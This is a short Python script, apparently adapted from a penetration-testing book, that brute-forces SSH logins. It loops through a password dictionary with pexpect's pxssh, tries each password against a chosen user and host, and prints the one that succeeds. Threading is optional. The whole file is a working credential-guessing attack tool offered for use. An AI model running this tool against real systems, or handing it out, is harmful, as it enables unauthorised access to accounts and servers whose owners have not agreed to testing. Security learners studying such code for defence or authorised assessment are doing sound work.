#Made by FoxSinOfGreed1729
#Many thanks to TJ O'Connor

from pexpect import pxssh
import optparse
import threading

def connect(user,host,password):
    
    try:
        s=pxssh.pxssh()
        s.login(host,user,password)
        print("Password is -->", password)
        return s
    except:
        pass
def connectThread(user, host, passwd):
    
    passwdfile=open(passwd,'r')
    for line in passwdfile.readlines():
        password=line.strip('\n')
        print("Trying password --> ",password)
        try:
            s=pxssh.pxssh()
            s.login(host,user,password)
            print("Password is -->", password)
            return s
        except:
            pass

def main():
    print("Remember, a bruteforce tool is only as good as the dictionary bring provided. Make a good dictionary")
    usage = "usage: python3 ssh_brute.py [options] argument use -h for help"
    parser=optparse.OptionParser(usage=usage)
    parser.add_option('-u', dest='user', type='string', help='Specify User name')
    parser.add_option('-H', dest='host', type='string', help='Specify host name')
    parser.add_option('-p', dest='passwd', type='string', help='Specify dictionary file')
    parser.add_option('-t', dest='th1', action="store_false", default=True, help='Specify if you want to thread the process. Makes it faster but slightly more haphazard' )
    (options, args)=parser.parse_args()
    user=options.user
    host=options.host
    passwd=options.passwd
    th1=options.th1
    if(user==None)| (host==None)|(passwd==None):
        print(parser.usage)
        exit(0)
    passwdfile=open(options.passwd,'r')
    if th1:
        print("Doing a threaded bruteforce....")
        t=threading.Thread(target=connectThread,args=(user, host, passwd))
        t.start()
    else:
        print("Not using threads....")
        for line in passwdfile.readlines():
            password=line.strip('\n')
            print("Trying password --> ",password)
            s=connect(user, host, password)
    exit(0)
main()
